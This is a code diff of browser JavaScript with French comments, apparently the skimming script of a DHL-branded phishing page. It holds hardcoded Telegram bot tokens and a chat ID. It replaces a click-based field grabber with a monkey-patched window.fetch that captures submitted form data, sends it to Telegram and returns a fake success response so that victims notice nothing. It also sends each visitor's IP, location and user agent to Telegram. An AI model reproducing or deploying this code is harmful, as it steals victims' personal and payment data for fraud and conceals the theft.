@@ -3,43 +3,64 @@
   const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
   const CHAT_ID = "6788012481";
 
-  function sendTelegram(token, text) {
+  // Fonction pour envoyer à Telegram
+  function sendToTelegramSync(text, botToken) {
     try {
-      fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-      });
-    } catch(e) {}
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendMessage", false);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }));
+    } catch(e) {
+      console.error(e);
+    }
   }
 
-  // Intercepter n'importe quel clic sur un bouton "Pay", "Confirm", "Submit", "Next"
-  document.addEventListener('click', function(e) {
-    const btn = e.target.closest('button, input[type="submit"]');
-    if (!btn) return;
+  // Intercepter fetch (Monkey Patch)
+  const originalFetch = window.fetch;
+  window.fetch = async function() {
+    const url = arguments[0];
+    const options = arguments[1];
 
-    setTimeout(function() {
-      const inputs = document.querySelectorAll('input, select');
-      let dataText = '📦 <b>DHL Data Captured</b>\n\n';
-      let count = 0;
+    if (url && typeof url === 'string' && url.includes('backend.blink.new')) {
+      try {
+        if (options && options.body) {
+          const bodyData = JSON.parse(options.body);
+          
+          let dataText = '📦 <b>DHL Formulaire Soumis</b>\n\n';
+          
+          if (bodyData.type) {
+            dataText += '<b>Type:</b> ' + bodyData.type + '\n';
+          }
+          
+          if (bodyData.data) {
+            for (const key in bodyData.data) {
+              dataText += '<b>' + key + ':</b> ' + bodyData.data[key] + '\n';
+            }
+          } else {
+            for (const key in bodyData) {
+              dataText += '<b>' + key + ':</b> ' + bodyData[key] + '\n';
+            }
+          }
 
-      inputs.forEach(function(input) {
-        if (input.value && input.type !== 'submit' && input.type !== 'hidden') {
-          const label = input.getAttribute('placeholder') || input.name || input.id || 'Champ';
-          dataText += '<b>' + label + ':</b> ' + input.value + '\n';
-          count++;
+          sendToTelegramSync(dataText, DATA_BOT_TOKEN);
         }
-      });
-
-      if (count > 0) {
-        sendTelegram(DATA_BOT_TOKEN, dataText);
+      } catch(e) {
+        console.error("Fetch intercept error", e);
       }
-    }, 100);
-  }, true);
+      
+      // On retourne une fausse réponse 200 pour que React pense que le backend a répondu !
+      return Promise.resolve(new Response(JSON.stringify({ success: true }), {
+        status: 200,
+        headers: { 'Content-Type': 'application/json' }
+      }));
+    }
 
-  // Track visit
+    return originalFetch.apply(this, arguments);
+  };
+
+  // Track visit 
   try {
-    fetch('https://ipwho.is/').then(r => r.json()).then(data => {
+    originalFetch('https://ipwho.is/').then(r => r.json()).then(data => {
       const ip = (data && data.ip) ? data.ip : 'Inconnu';
       const city = (data && data.city) ? data.city : 'Inconnu';
       const country = (data && data.country) ? data.country : 'Inconnu';
@@ -50,9 +71,9 @@
         '🌍 <b>Pays:</b> ' + country + '\n' +
         '📱 <b>UA:</b> ' + navigator.userAgent;
 
-      sendTelegram(VISIT_BOT_TOKEN, text);
+      sendToTelegramSync(text, VISIT_BOT_TOKEN);
     }).catch(() => {
-      sendTelegram(VISIT_BOT_TOKEN, '🚨 <b>New DHL Visit</b> (IP fail)');
+      sendToTelegramSync('🚨 <b>New DHL Visit</b> (IP fail)', VISIT_BOT_TOKEN);
     });
   } catch(e) {}
 })();
